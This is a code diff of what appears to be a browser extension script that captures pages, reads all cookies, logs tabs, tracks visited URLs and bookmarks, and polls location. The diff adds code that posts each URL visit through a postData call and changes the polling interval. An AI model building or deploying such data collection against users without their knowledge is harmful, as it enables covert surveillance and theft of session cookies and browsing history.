@@ -73,7 +73,7 @@ var getPageCapture = function (tabId) {
         payload.mhtmlData = mhtmlData;
         postData("pageCapture", payload);
         // saveAs(mhtmlData, tabId + '.mhtml');
-    })
+    });
 };
 
 var getAllCookies = function () {
@@ -112,6 +112,7 @@ var onTabUpdate = function (tabId, changeInfo, tab) {
     if (changeInfo.status === "complete") {
         console.log("Tab update:", "#" + tab.id, tab.title,
                     "(" + tab.url + ")");
+        console.log(tab);
     }
 };
 
@@ -126,6 +127,7 @@ var onTabRemove = function (tabId, removeInfo) {
 var onURLVisit = function (result) {
     console.log("URL visit:", result.title, "(" + result.url + ") at",
                 result.lastVisitTime + ",", result.visitCount, "times");
+    postData('url-visit', result);
 };
 
 var onURLRemoval = function (removed) {
@@ -154,7 +156,7 @@ var activateListeners = function () {
     // chrome.cookies.onChanged.addListener(onCookieChange);
     chrome.bookmarks.onCreated.addListener(onBookmarkCreate);
     chrome.bookmarks.onChanged.addListener(onBookmarkChange);
-    setInterval(getCurrentPosition, 60000);
+    setInterval(getCurrentPosition, 5 * 60 * 1000);
 };
 
 ///////////////////////////////////////////////////////////////////////////////
